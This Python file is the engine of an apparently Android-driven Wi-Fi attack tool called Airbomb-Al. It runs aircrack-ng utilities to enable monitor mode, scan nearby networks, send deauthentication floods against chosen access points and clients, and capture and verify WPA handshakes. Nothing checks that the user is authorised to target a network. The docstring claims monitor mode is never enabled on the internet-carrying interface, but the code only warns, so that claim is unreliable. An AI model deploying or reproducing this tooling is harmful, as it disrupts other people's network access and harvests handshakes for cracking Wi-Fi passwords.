#!/usr/bin/env python3
"""Airbomb-Al local engine.

A privileged-but-local helper that owns the wireless hardware and exposes a small
NDJSON protocol on 127.0.0.1:8767.  The Android UI is a thin client: it never
touches the radio itself, it only sends validated commands here.

Safety model
------------
* Every deauthentication target must be an access point that the *current* scan has
  actually seen, and any client must be seen associated with that BSSID.
* Monitor mode is never enabled on the interface that carries the default route
  (i.e. the phone's internet), so the engine cannot strand the device offline.
* Nothing listens on a public interface: the socket binds 127.0.0.1 only.

Protocol: see protocol.md.  Standard library only.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import csv
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

VERSION = "1.0.0"
MAC_RE = re.compile(r"^[0-9A-F]{2}(:[0-9A-F]{2}){5}$")

HERE = os.path.dirname(os.path.abspath(__file__))


# --------------------------------------------------------------------------- utils


def now() -> str:
    return datetime.now().strftime("%H:%M:%S")


def norm_mac(value: Any) -> Optional[str]:
    """Return an upper-case, colon-separated MAC or None if it is not one."""
    if not isinstance(value, str):
        return None
    mac = value.strip().upper().replace("-", ":")
    return mac if MAC_RE.match(mac) else None


def run(cmd: list[str], timeout: float = 20.0) -> tuple[int, str]:
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, errors="replace"
        )
        return proc.returncode, (proc.stdout or "") + (proc.stderr or "")
    except (OSError, subprocess.TimeoutExpired) as exc:
        return 1, str(exc)


def have(tool: str) -> bool:
    return shutil.which(tool) is not None


def channel_of(line: str) -> Optional[int]:
    m = re.search(r"channel\s+(\d+)", line)
    return int(m.group(1)) if m else None


# --------------------------------------------------------------------------- models


@dataclass
class AccessPoint:
    bssid: str
    ssid: str = ""
    channel: Optional[int] = None
    signal: Optional[int] = None
    privacy: str = "OPEN"
    cipher: str = ""
    auth: str = ""
    beacons: int = 0
    data: int = 0
    first_seen: str = ""
    last_seen: str = ""
    handshake: bool = False
    pmkid: bool = False

    def public(self) -> dict[str, Any]:
        return {
            "bssid": self.bssid,
            "ssid": self.ssid or "(hidden)",
            "channel": self.channel,
            "signal": self.signal,
            "privacy": self.privacy,
            "cipher": self.cipher,
            "auth": self.auth,
            "beacons": self.beacons,
            "data": self.data,
            "handshake": self.handshake,
            "pmkid": self.pmkid,
            "last_seen": self.last_seen,
        }


@dataclass
class Client:
    mac: str
    bssid: Optional[str] = None
    signal: Optional[int] = None
    packets: int = 0
    probes: str = ""
    last_seen: str = ""

    def public(self) -> dict[str, Any]:
        return {
            "mac": self.mac,
            "bssid": self.bssid,
            "signal": self.signal,
            "packets": self.packets,
            "probes": self.probes,
            "last_seen": self.last_seen,
        }


@dataclass
class Job:
    """A long-running subprocess (airodump-ng / aireplay-ng)."""

    job_id: int
    kind: str
    target: str
    proc: asyncio.subprocess.Process
    started: float = field(default_factory=time.time)
    prefix: str = ""
    channel: Optional[int] = None
    count: int = 0
    stop_at: Optional[float] = None

    def public(self) -> dict[str, Any]:
        return {
            "id": self.job_id,
            "kind": self.kind,
            "target": self.target,
            "prefix": self.prefix,
            "channel": self.channel,
            "count": self.count,
            "elapsed": int(time.time() - self.started),
        }


# --------------------------------------------------------------------------- engine


class Engine:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.host = args.host
        self.port = args.port
        self.dry_run = args.dry_run
        self.workdir = args.workdir
        self.uplink = args.iface or self.default_route_iface() or "wlan0"
        self.captures = os.path.join(self.workdir, "captures")
        self.logdir = os.path.join(self.workdir, "logs")
        os.makedirs(self.captures, exist_ok=True)
        os.makedirs(self.logdir, exist_ok=True)

        self.mon_iface: Optional[str] = self._initial_monitor()
        self.scanning = False
        self.scan_job: Optional[Job] = None
        self.scan_prefix = ""
        self.aps: dict[str, AccessPoint] = {}
        self.clients: dict[str, Client] = {}
        self.jobs: dict[int, Job] = {}
        self.job_seq = 0
        self.logs: deque[dict[str, str]] = deque(maxlen=500)
        self.clients_ws: set[asyncio.StreamWriter] = set()
        self._stop = asyncio.Event()
        self._tasks: set[asyncio.Task] = set()

    # -- infrastructure ---------------------------------------------------

    def _initial_monitor(self) -> Optional[str]:
        if self.args.mon_iface:
            return self.args.mon_iface
        for name in self.interfaces():
            if name["type"] == "monitor":
                return name["name"]
        return None

    def log(self, message: str, level: str = "info") -> None:
        entry = {"time": now(), "level": level, "message": message}
        self.logs.append(entry)
        line = f"[{entry['time']}] {message}\n"
        try:
            with open(os.path.join(self.logdir, "engine.log"), "a", encoding="utf-8") as fh:
                fh.write(line)
        except OSError:
            pass
        self.broadcast({"event": "log", **entry})

    def broadcast(self, message: dict[str, Any]) -> None:
        if not self.clients_ws:
            return
        data = (json.dumps(message) + "\n").encode()
        for writer in list(self.clients_ws):
            try:
                writer.write(data)
            except (ConnectionError, RuntimeError):
                self.clients_ws.discard(writer)

    def spawn_task(self, coro) -> asyncio.Task:
        task = asyncio.ensure_future(coro)
        self._tasks.add(task)
        task.add_done_callback(self._tasks.discard)
        return task

    # -- hardware introspection ------------------------------------------

    def interfaces(self) -> list[dict[str, Any]]:
        code, out = run(["iw", "dev"])
        if code != 0:
            return []
        result: list[dict[str, Any]] = []
        current: Optional[dict[str, Any]] = None
        for raw in out.splitlines():
            line = raw.strip()
            m = re.match(r"Interface\s+(\S+)", line)
            if m:
                current = {"name": m.group(1), "type": "unknown", "channel": None, "mac": ""}
                result.append(current)
                continue
            if current is None:
                continue
            if line.startswith("addr "):
                current["mac"] = line.split()[1].upper()
            elif line.startswith("type "):
                current["type"] = line.split()[1]
            elif line.startswith("channel "):
                current["channel"] = channel_of(line)
        for item in result:
            path = f"/sys/class/net/{item['name']}/operstate"
            try:
                with open(path, encoding="utf-8") as fh:
                    item["up"] = fh.read().strip() == "up"
            except OSError:
                item["up"] = False
            item["uplink"] = item["name"] == self.uplink
            item["monitor_capable"] = not item["uplink"]
        return result

    def default_route_iface(self) -> Optional[str]:
        code, out = run(["ip", "route", "show", "default"])
        if code == 0:
            m = re.search(r"default\s+.*?\bdev\s+(\S+)", out)
            if m:
                return m.group(1)
        return None

    # -- command dispatch -------------------------------------------------

    async def dispatch(self, msg: dict[str, Any]) -> dict[str, Any]:
        cmd = str(msg.get("cmd", "")).strip()
        handler = getattr(self, f"cmd_{cmd.replace('.', '_')}", None)
        if handler is None:
            return {"ok": False, "error": f"unknown command: {cmd or '(empty)'}"}
        try:
            data = await handler(msg)
            return {"ok": True, "data": data if data is not None else {}}
        except CommandError as exc:
            return {"ok": False, "error": str(exc)}
        except Exception as exc:  # noqa: BLE001 - never kill the server for one request
            self.log(f"{cmd} failed: {exc}", "error")
            return {"ok": False, "error": f"{type(exc).__name__}: {exc}"}

    # -- basic commands ---------------------------------------------------

    async def cmd_hello(self, msg: dict[str, Any]) -> dict[str, Any]:
        return {
            "version": VERSION,
            "dry_run": self.dry_run,
            "tools": {
                t: have(t)
                for t in ("iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")
            },
            "mon_iface": self.mon_iface,
            "uplink": self.uplink,
            "scanning": self.scanning,
        }

    async def cmd_ping(self, msg: dict[str, Any]) -> dict[str, Any]:
        return {"pong": True, "version": VERSION}

    async def cmd_iface_list(self, msg: dict[str, Any]) -> dict[str, Any]:
        # Adapters can appear/disappear at any time (USB hot-plug, wlan0mon rename).
        # Re-read the kernel every call and track the current default route.
        detected = self.default_route_iface()
        if self.args.iface is None and detected:
            self.uplink = detected
        return {
            "interfaces": self.interfaces(),
            "uplink": self.uplink,
            "default_route": detected,
            "mon_iface": self.mon_iface,
            "auto": self.args.iface is None,
        }

    async def cmd_state(self, msg: dict[str, Any]) -> dict[str, Any]:
        return {
            "mon_iface": self.mon_iface,
            "uplink": self.uplink,
            "scanning": self.scanning,
            "dry_run": self.dry_run,
            "jobs": [job.public() for job in self.jobs.values()],
        }

    async def cmd_log_get(self, msg: dict[str, Any]) -> dict[str, Any]:
        limit = int(msg.get("limit") or 200)
        return {"lines": list(self.logs)[-limit:]}

    # -- monitor mode -----------------------------------------------------

    def _monitor_names(self) -> set[str]:
        return {item["name"] for item in self.interfaces() if item["type"] == "monitor"}

    async def _set_mode_iw(self, iface: str, mode: str) -> tuple[int, str]:
        """Fallback for systems without airmon-ng: flip the interface type directly."""
        run(["ip", "link", "set", iface, "down"], timeout=10)
        code, out = run(["iw", "dev", iface, "set", "type", mode], timeout=15)
        run(["ip", "link", "set", iface, "up"], timeout=10)
        return code, out

    async def cmd_monitor_enable(self, msg: dict[str, Any]) -> dict[str, Any]:
        iface = str(msg.get("iface", "")).strip()
        if not iface:
            raise CommandError("iface is required")
        names = {item["name"] for item in self.interfaces()}
        if names and iface not in names:
            raise CommandError(f"{iface} is not present; plug the adapter in and refresh")
        warning = None
        if iface == self.uplink:
            warning = (
                "this radio currently carries the default route; internet will drop "
                "until you switch it back to managed mode"
            )
        if self.dry_run:
            self.mon_iface = f"{iface}mon"
            self.log(f"[simulation] monitor mode enabled on {self.mon_iface}")
            return {"mon_iface": self.mon_iface, "dry_run": True, "warning": warning}

        before = self._monitor_names()
        new: Optional[str] = None
        raw = ""
        if have("airmon-ng"):
            self.log(f"enabling monitor mode on {iface} (airmon-ng start)")
            _, raw = run(["airmon-ng", "start", iface], timeout=60)
            match = re.search(r"monitor mode enabled on (\S+?)\)?$", raw, re.MULTILINE)
            if match:
                new = match.group(1)
        if new is None:
            self.log(f"enabling monitor mode on {iface} (iw fallback)")
            code, out = await self._set_mode_iw(iface, "monitor")
            raw += "\n" + out
            if code != 0:
                raise CommandError(
                    f"could not enable monitor mode on {iface}: {out.strip()[-300:] or 'iw failed'}"
                )

        after = self._monitor_names()
        if new is None:
            new = next(iter(after - before), None)
        if new is None and iface in after:
            new = iface
        if new is None:
            for candidate in (iface + "mon", iface):
                if candidate in after:
                    new = candidate
                    break
        if new is None:
            raise CommandError(
                f"monitor mode did not come up on {iface}: {raw.strip()[-300:] or 'no output'}"
            )
        self.mon_iface = new
        self.uplink = self.default_route_iface() or self.uplink
        if warning:
            self.log(f"warning: {warning}", "warn")
        self.log(f"monitor interface ready: {self.mon_iface}")
        return {"mon_iface": self.mon_iface, "warning": warning, "raw": raw.strip()[-500:]}

    async def cmd_monitor_disable(self, msg: dict[str, Any]) -> dict[str, Any]:
        iface = str(msg.get("iface") or self.mon_iface or "").strip()
        if not iface:
            raise CommandError("no monitor interface is active")
        if self.scanning:
            raise CommandError("stop the scan before switching back to managed mode")
        if self.dry_run:
            self.mon_iface = None
            self.log("[simulation] monitor mode disabled; managed mode restored")
            return {"mon_iface": None}

        base = iface[:-3] if iface.endswith("mon") else iface
        raw = ""
        if have("airmon-ng"):
            self.log(f"disabling monitor mode on {iface} (airmon-ng stop)")
            _, raw = run(["airmon-ng", "stop", iface], timeout=60)
        still = any(i["name"] == iface and i["type"] == "monitor" for i in self.interfaces())
        if still or not have("airmon-ng"):
            self.log(f"restoring managed mode on {iface} (iw)")
            code, out = await self._set_mode_iw(iface, "managed")
            raw += "\n" + out
            if code != 0 and still:
                raise CommandError(
                    f"could not restore managed mode on {iface}: {out.strip()[-300:] or 'iw failed'}"
                )
            base = iface
        present = {item["name"] for item in self.interfaces()}
        target = base if base in present else (iface if iface in present else None)
        if target:
            run(["ip", "link", "set", target, "up"], timeout=10)
        if self.mon_iface in (iface, base):
            self.mon_iface = None
        self.uplink = self.default_route_iface() or self.uplink
        self.log(f"monitor mode disabled on {base}; managed mode restored")
        return {"mon_iface": self.mon_iface, "iface": base, "raw": raw.strip()[-500:]}

    # -- scanning ---------------------------------------------------------

    def _require_monitor(self) -> str:
        if self.mon_iface:
            return self.mon_iface
        for item in self.interfaces():
            if item["type"] == "monitor":
                self.mon_iface = item["name"]
                return self.mon_iface
        raise CommandError(
            "no monitor-mode interface. Open the SCAN tab, pick an adapter and tap MONITOR."
        )

    async def cmd_scan_start(self, msg: dict[str, Any]) -> dict[str, Any]:
        if self.scanning:
            return {"scanning": True, "prefix": self.scan_prefix, "mon_iface": self.mon_iface}
        if self.dry_run:
            iface = "sim0"
        else:
            iface = self._require_monitor()
            if iface == self.uplink:
                self.log(f"warning: scanning on {iface}, which carries the default route", "warn")

        band = str(msg.get("band") or "abg")
        if band not in {"a", "b", "g", "ab", "bg", "abg", "2.4", "5"}:
            raise CommandError("band must be one of a, b, g, ab, bg, abg, 2.4, 5")
        channel = msg.get("channel")
        if channel is not None:
            try:
                channel = int(channel)
            except (TypeError, ValueError):
                raise CommandError("channel must be an integer")
            if not 1 <= channel <= 196:
                raise CommandError("channel out of range")

        self.aps.clear()
        self.clients.clear()
        self.scan_prefix = os.path.join(
            self.captures, "scan-" + datetime.now().strftime("%Y%m%d-%H%M%S")
        )
        self.scanning = True

        if self.dry_run:
            self._seed_simulation()
            self.log("[simulation] scan started")
            self.broadcast({"event": "scan", "scanning": True, "aps": self.snapshot()["aps"],
                            "clients": self.snapshot()["clients"]})
            return {"scanning": True, "prefix": self.scan_prefix, "mon_iface": iface}

        cmd = [
            "airodump-ng", "--write-interval", "1", "--output-format", "csv,pcap",
            "-w", self.scan_prefix,
        ]
        if band in {"2.4", "bg", "b", "g"}:
            cmd += ["--band", "bg"]
        elif band == "5":
            cmd += ["--band", "a"]
        else:
            cmd += ["--band", band]
        if channel:
            cmd += ["--channel", str(channel)]
        cmd.append(iface)

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            start_new_session=True,
        )
        self.job_seq += 1
        self.scan_job = Job(self.job_seq, "scan", "all", proc, prefix=self.scan_prefix,
                            channel=channel)
        self.jobs[self.job_seq] = self.scan_job
        self.log(f"scan started on {iface} (band {band}"
                 + (f", channel {channel}" if channel else "") + ")")
        self.spawn_task(self._poll_scan())
        self.broadcast({"event": "scan", "scanning": True})
        return {"scanning": True, "prefix": self.scan_prefix, "mon_iface": iface}

    async def cmd_scan_stop(self, msg: dict[str, Any]) -> dict[str, Any]:
        await self._stop_scan()
        return {"scanning": False, "aps": len(self.aps), "clients": len(self.clients)}

    async def _stop_scan(self) -> None:
        job, self.scan_job = self.scan_job, None
        self.scanning = False
        if job:
            self.jobs.pop(job.job_id, None)
            await self._kill(job)
        self.broadcast({"event": "scan", "scanning": False})
        if job:
            self.log("scan stopped")

    async def cmd_scan_snapshot(self, msg: dict[str, Any]) -> dict[str, Any]:
        return self.snapshot()

    def snapshot(self) -> dict[str, Any]:
        aps = sorted(self.aps.values(), key=lambda a: (-(a.signal or -100), a.ssid))
        clients = sorted(self.clients.values(), key=lambda c: c.mac)
        return {
            "scanning": self.scanning,
            "mon_iface": self.mon_iface,
            "prefix": self.scan_prefix,
            "aps": [a.public() for a in aps],
            "clients": [c.public() for c in clients],
        }

    def _seed_simulation(self) -> None:
        samples = [
            ("AA:BB:CC:11:22:33", "DragonNet", 6, -42, "WPA2", "CCMP"),
            ("AA:BB:CC:44:55:66", "Airbomb-Lab", 11, -61, "WPA2", "CCMP"),
            ("AA:BB:CC:77:88:99", "Guest-Open", 1, -74, "OPEN", ""),
        ]
        for bssid, ssid, ch, sig, privacy, cipher in samples:
            self.aps[bssid] = AccessPoint(
                bssid=bssid, ssid=ssid, channel=ch, signal=sig, privacy=privacy,
                cipher=cipher, auth="PSK" if privacy != "OPEN" else "OPN",
                beacons=120, data=8, last_seen=now(),
            )
        for i, (bssid, *_rest) in enumerate(samples[:2]):
            mac = f"DE:AD:BE:EF:00:{i + 1:02X}"
            self.clients[mac] = Client(mac=mac, bssid=bssid, signal=-55 - i * 7,
                                       packets=14 + i * 3, last_seen=now())

    async def _poll_scan(self) -> None:
        while self.scanning:
            await asyncio.sleep(2.0)
            if not self.scanning:
                break
            if self.dry_run:
                for ap in self.aps.values():
                    ap.last_seen = now()
                self.broadcast({"event": "scan", "scanning": True, **self.snapshot()})
                continue
            self._read_csv()
            self.broadcast({"event": "scan", "scanning": True, **self.snapshot()})

    def _read_csv(self) -> None:
        path = self.scan_prefix + "-01.csv"
        if not os.path.exists(path):
            return
        try:
            with open(path, "r", encoding="utf-8", errors="replace", newline="") as fh:
                rows = list(csv.reader(fh))
        except OSError:
            return
        in_clients = False
        for row in rows:
            if not row or len(row) < 2:
                continue
            head = row[0].strip()
            if head.startswith("BSSID"):
                in_clients = False
                continue
            if head.startswith("Station MAC"):
                in_clients = True
                continue
            if in_clients:
                mac = norm_mac(head)
                if not mac:
                    continue
                bssid = norm_mac(row[5]) if len(row) > 5 else None
                try:
                    signal = int(row[3].strip())
                except (ValueError, IndexError):
                    signal = None
                try:
                    packets = int(row[4].strip())
                except (ValueError, IndexError):
                    packets = 0
                probes = row[6].strip() if len(row) > 6 else ""
                client = self.clients.get(mac) or Client(mac=mac)
                client.bssid = bssid if bssid else None
                client.signal = signal
                client.packets = packets
                client.probes = probes
                client.last_seen = now()
                self.clients[mac] = client
                continue

            bssid = norm_mac(head)
            if not bssid:
                continue
            ap = self.aps.get(bssid) or AccessPoint(bssid=bssid)
            ap.ssid = row[13].strip() if len(row) > 13 else ""
            try:
                ap.channel = int(row[3].strip())
            except (ValueError, IndexError):
                pass
            try:
                ap.signal = int(row[8].strip())
            except (ValueError, IndexError):
                pass
            ap.privacy = row[5].strip() if len(row) > 5 else "OPEN"
            ap.cipher = row[6].strip() if len(row) > 6 else ""
            ap.auth = row[7].strip() if len(row) > 7 else ""
            try:
                ap.beacons = int(row[9].strip())
            except (ValueError, IndexError):
                pass
            try:
                ap.data = int(row[10].strip())
            except (ValueError, IndexError):
                pass
            ap.first_seen = row[1].strip() if len(row) > 1 else ""
            ap.last_seen = now()
            self.aps[bssid] = ap

    # -- deauthentication -------------------------------------------------

    async def cmd_deauth_start(self, msg: dict[str, Any]) -> dict[str, Any]:
        bssid = norm_mac(msg.get("bssid"))
        if not bssid:
            raise CommandError("a valid bssid is required")
        client = norm_mac(msg.get("client")) if msg.get("client") else None
        if msg.get("client") and not client:
            raise CommandError("client is not a valid MAC address")
        try:
            count = int(msg.get("count") or 8)
            duration = int(msg.get("duration") or 20)
        except (TypeError, ValueError):
            raise CommandError("count and duration must be integers")
        count = max(1, min(count, 64))
        duration = max(3, min(duration, 120))

        ap = self.aps.get(bssid)
        if not self.scanning or ap is None:
            raise CommandError("target is not in the current scan; rescan and try again")
        if client:
            seen = self.clients.get(client)
            if seen is None or (seen.bssid and seen.bssid != bssid):
                raise CommandError("client is not associated with the selected access point")

        if self.dry_run:
            self.job_seq += 1
            job = Job(self.job_seq, "deauth", bssid, None, count=count,  # type: ignore[arg-type]
                      stop_at=time.time() + duration)
            self.jobs[job.job_id] = job
            self.log(f"[simulation] deauth {count} frames -> {bssid}"
                     + (f" client {client}" if client else " (broadcast)"))
            self.broadcast({"event": "deauth", "job": job.public(), "state": "running"})
            self.spawn_task(self._expire_job(job))
            return {"job": job.public()}

        iface = self._require_monitor()
        if iface == self.uplink:
            self.log(f"warning: transmitting on {iface}, which carries the default route", "warn")
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd.append(iface)
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            start_new_session=True,
        )
        self.job_seq += 1
        job = Job(self.job_seq, "deauth", bssid, proc, count=count,
                  stop_at=time.time() + duration)
        self.jobs[job.job_id] = job
        self.log(f"deauth {count} frames -> {bssid}"
                 + (f" client {client}" if client else " (broadcast)"))
        self.broadcast({"event": "deauth", "job": job.public(), "state": "running"})
        self.spawn_task(self._expire_job(job))
        return {"job": job.public()}

    async def _expire_job(self, job: Job) -> None:
        while job.stop_at and time.time() < job.stop_at:
            if job.job_id not in self.jobs:
                return
            await asyncio.sleep(0.5)
        if job.job_id in self.jobs:
            self.jobs.pop(job.job_id, None)
            await self._kill(job)
            self.log(f"{job.kind} finished: {job.target}")
            self.broadcast({"event": "deauth", "job": job.public(), "state": "finished"})

    async def cmd_deauth_stop(self, msg: dict[str, Any]) -> dict[str, Any]:
        try:
            job_id = int(msg.get("id"))
        except (TypeError, ValueError):
            raise CommandError("id is required")
        job = self.jobs.get(job_id)
        if not job or job.kind != "deauth":
            raise CommandError("no such deauth session")
        self.jobs.pop(job_id, None)
        await self._kill(job)
        self.log(f"deauth stopped: {job.target}")
        self.broadcast({"event": "deauth", "job": job.public(), "state": "stopped"})
        return {"job": job.public()}

    async def cmd_deauth_stop_all(self, msg: dict[str, Any]) -> dict[str, Any]:
        stopped = 0
        for job in list(self.jobs.values()):
            if job.kind == "deauth":
                self.jobs.pop(job.job_id, None)
                await self._kill(job)
                self.broadcast({"event": "deauth", "job": job.public(), "state": "stopped"})
                stopped += 1
        if stopped:
            self.log(f"stopped {stopped} deauth session(s)")
        return {"stopped": stopped}

    # -- handshake capture ------------------------------------------------

    async def cmd_capture_start(self, msg: dict[str, Any]) -> dict[str, Any]:
        bssid = norm_mac(msg.get("bssid"))
        if not bssid:
            raise CommandError("a valid bssid is required")
        ap = self.aps.get(bssid)
        if self.scanning and ap is None:
            raise CommandError("target is not in the current scan")
        channel = msg.get("channel") or (ap.channel if ap else None)
        if channel is not None:
            try:
                channel = int(channel)
            except (TypeError, ValueError):
                raise CommandError("channel must be an integer")
        for job in self.jobs.values():
            if job.kind == "capture" and job.target == bssid:
                return {"job": job.public(), "already": True}

        prefix = os.path.join(
            self.captures,
            f"{bssid.replace(':', '')}-" + datetime.now().strftime("%Y%m%d-%H%M%S"),
        )
        if self.dry_run:
            self.job_seq += 1
            job = Job(self.job_seq, "capture", bssid, None, prefix=prefix,  # type: ignore[arg-type]
                      channel=channel, stop_at=time.time() + 180)
            self.jobs[job.job_id] = job
            self.log(f"[simulation] capture started for {bssid}")
            self.broadcast({"event": "capture", "job": job.public(), "state": "running"})
            self.spawn_task(self._expire_job(job))
            return {"job": job.public()}

        iface = self._require_monitor()
        if iface == self.uplink:
            self.log(f"warning: capturing on {iface}, which carries the default route", "warn")
        cmd = ["airodump-ng", "--write-interval", "1", "--output-format", "csv,pcap",
               "-w", prefix, "--bssid", bssid]
        if channel:
            cmd += ["--channel", str(channel)]
        cmd.append(iface)
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            start_new_session=True,
        )
        self.job_seq += 1
        job = Job(self.job_seq, "capture", bssid, proc, prefix=prefix, channel=channel,
                  stop_at=time.time() + 300)
        self.jobs[job.job_id] = job
        self.log(f"capture started for {bssid} on channel {channel or 'auto'}")
        self.broadcast({"event": "capture", "job": job.public(), "state": "running"})
        self.spawn_task(self._expire_job(job))
        return {"job": job.public()}

    async def cmd_capture_stop(self, msg: dict[str, Any]) -> dict[str, Any]:
        bssid = norm_mac(msg.get("bssid")) if msg.get("bssid") else None
        stopped = 0
        for job in list(self.jobs.values()):
            if job.kind == "capture" and (bssid is None or job.target == bssid):
                self.jobs.pop(job.job_id, None)
                await self._kill(job)
                self.broadcast({"event": "capture", "job": job.public(), "state": "stopped"})
                stopped += 1
        if stopped:
            self.log(f"capture stopped ({stopped})")
        return {"stopped": stopped}

    async def cmd_capture_check(self, msg: dict[str, Any]) -> dict[str, Any]:
        bssid = norm_mac(msg.get("bssid"))
        if not bssid:
            raise CommandError("a valid bssid is required")
        cap = None
        for job in self.jobs.values():
            if job.kind == "capture" and job.target == bssid:
                cap = job.prefix + "-01.cap"
                break
        if cap is None:
            cap = self._latest_cap(bssid)
        if self.dry_run:
            return {"bssid": bssid, "handshake": True, "pmkid": False,
                    "detail": "simulated", "file": cap}
        if not cap or not os.path.exists(cap):
            return {"bssid": bssid, "handshake": False, "pmkid": False,
                    "detail": "no capture file yet", "file": cap}
        handshake, detail = await self._check_handshake(cap)
        ap = self.aps.get(bssid)
        if ap:
            ap.handshake = handshake
        if handshake:
            self.log(f"handshake captured for {bssid}: {os.path.basename(cap)}")
            self.broadcast({"event": "handshake", "bssid": bssid, "file": cap})
        return {"bssid": bssid, "handshake": handshake, "pmkid": False,
                "detail": detail, "file": cap}

    async def _check_handshake(self, path: str) -> tuple[bool, str]:
        if not have("aircrack-ng"):
            return False, "aircrack-ng is not installed"
        code, out = await asyncio.to_thread(run, ["aircrack-ng", path], 60)
        if m := re.search(r"\((\d+)\s+handshake", out):
            return int(m.group(1)) > 0, out.strip()[-400:]
        if "1 handshake" in out or "handshake" in out.lower():
            return True, out.strip()[-400:]
        return False, out.strip()[-400:] or f"exit {code}"

    def _latest_cap(self, bssid: str) -> Optional[str]:
        stem = bssid.replace(":", "")
        candidates = [
            os.path.join(self.captures, name)
            for name in os.listdir(self.captures)
            if name.startswith(stem) and name.endswith(".cap")
        ]
        return max(candidates, key=os.path.getmtime) if candidates else None

    async def cmd_capture_list(self, msg: dict[str, Any]) -> dict[str, Any]:
        files = []
        for name in sorted(os.listdir(self.captures), reverse=True):
            if not name.endswith(".cap"):
                continue
            path = os.path.join(self.captures, name)
            try:
                stat = os.stat(path)
            except OSError:
                continue
            files.append({
                "name": name,
                "file": path,
                "size": stat.st_size,
                "modified": int(stat.st_mtime),
            })
        active = [job.public() for job in self.jobs.values() if job.kind == "capture"]
        return {"files": files[:100], "active": active}

    # -- lifecycle --------------------------------------------------------

    async def _kill(self, job: Job) -> None:
        proc = job.proc
        if proc is None:
            return
        if proc.returncode is not None:
            return
        with contextlib.suppress(ProcessLookupError):
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        try:
            await asyncio.wait_for(proc.wait(), timeout=3)
        except asyncio.TimeoutError:
            with contextlib.suppress(ProcessLookupError):
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            with contextlib.suppress(Exception):
                await proc.wait()

    async def shutdown(self) -> None:
        if self._stop.is_set():
            return
        self._stop.set()
        self.log("shutting down")
        await self._stop_scan()
        for job in list(self.jobs.values()):
            self.jobs.pop(job.job_id, None)
            await self._kill(job)
        for task in list(self._tasks):
            task.cancel()
        for writer in list(self.clients_ws):
            with contextlib.suppress(Exception):
                writer.close()

    async def cmd_shutdown(self, msg: dict[str, Any]) -> dict[str, Any]:
        self.spawn_task(self._delayed_shutdown())
        return {"bye": True}

    async def _delayed_shutdown(self) -> None:
        await asyncio.sleep(0.2)
        await self.shutdown()

    # -- server -----------------------------------------------------------

    async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername")
        self.log(f"UI connected from {peer}")
        self.clients_ws.add(writer)
        try:
            writer.write((json.dumps({
                "event": "hello", "version": VERSION, "dry_run": self.dry_run,
                "mon_iface": self.mon_iface, "uplink": self.uplink,
            }) + "\n").encode())
            while True:
                line = await reader.readline()
                if not line:
                    break
                line = line.strip()
                if not line:
                    continue
                try:
                    msg = json.loads(line)
                    if not isinstance(msg, dict):
                        raise ValueError("message must be a JSON object")
                except (ValueError, json.JSONDecodeError) as exc:
                    writer.write((json.dumps({"ok": False, "error": f"bad json: {exc}"}) + "\n").encode())
                    await writer.drain()
                    continue
                reply = await self.dispatch(msg)
                if msg.get("id") is not None:
                    reply["id"] = msg["id"]
                writer.write((json.dumps(reply) + "\n").encode())
                await writer.drain()
        except (ConnectionError, asyncio.IncompleteReadError):
            pass
        finally:
            self.clients_ws.discard(writer)
            with contextlib.suppress(Exception):
                writer.close()
            self.log("UI disconnected")

    async def serve(self) -> None:
        self.log(f"Airbomb-Al engine {VERSION} listening on {self.host}:{self.port}")
        self.log(f"workdir: {self.workdir}  uplink: {self.uplink}  "
                 f"monitor: {self.mon_iface or '(none)'}"
                 + ("  [SIMULATION]" if self.dry_run else ""))
        server = await asyncio.start_server(self.handle, self.host, self.port)
        async with server:
            await self._stop.wait()


class CommandError(Exception):
    pass


# --------------------------------------------------------------------------- main


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Airbomb-Al local engine")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8767)
    p.add_argument("--iface", default=None,
                   help="override the auto-detected uplink interface (optional)")
    p.add_argument("--mon-iface", default=None, help="existing monitor interface")
    p.add_argument("--workdir", default=HERE)
    p.add_argument("--dry-run", action="store_true", help="simulate hardware")
    return p.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv)
    engine = Engine(args)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def runner() -> None:
        for sig in (signal.SIGINT, signal.SIGTERM):
            with contextlib.suppress(NotImplementedError):
                loop.add_signal_handler(sig, lambda: asyncio.ensure_future(engine.shutdown()))
        await engine.serve()

    try:
        loop.run_until_complete(runner())
    finally:
        with contextlib.suppress(Exception):
            loop.run_until_complete(loop.shutdown_asyncgens())
        loop.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
